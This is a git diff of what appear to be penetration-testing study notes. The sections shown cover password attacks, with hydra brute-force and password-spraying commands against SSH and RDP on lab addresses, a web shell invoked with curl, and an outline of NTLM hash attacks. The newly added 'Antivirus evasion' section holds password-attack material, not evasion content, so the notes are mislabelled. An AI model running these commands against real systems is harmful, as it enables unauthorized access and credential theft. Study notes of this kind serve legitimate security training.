@@ -692,8 +692,7 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
   - [+] Exploit succeeded, shell can be found at: https://192.168.171.45/uploads/shell.php
   - `curl -k https://192.168.50.45/uploads/shell.php?cmd=whoami`  
      
-### 15. Antivirus evasion
-### 16. Password attacks
+### 15. Password attacks
     - confirm ssh service running
       `sudo nmap -sV -p 2222 192.168.50.201`
     - unzip rockyou
@@ -702,6 +701,20 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
       `hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.160.201`
     - password spraying > enumerate username from a valid password
       `hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.160.201`
+
+### 16. Antivirus evasion  
+- attack network services login
+  - SSH
+    `hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201`  
+  - RDP
+  - HTTP POST login
+- password cracking
+  - 
+- password hashes
+  - NTLM
+  - NTLMv2
+  - relaying NTLMv2
+  - Windows credential guard
 
 ### 17. Windows Privilege Escalation
     - Goal: bypass UAC to execute at high integrity (admin member does not mean run with high integrity)
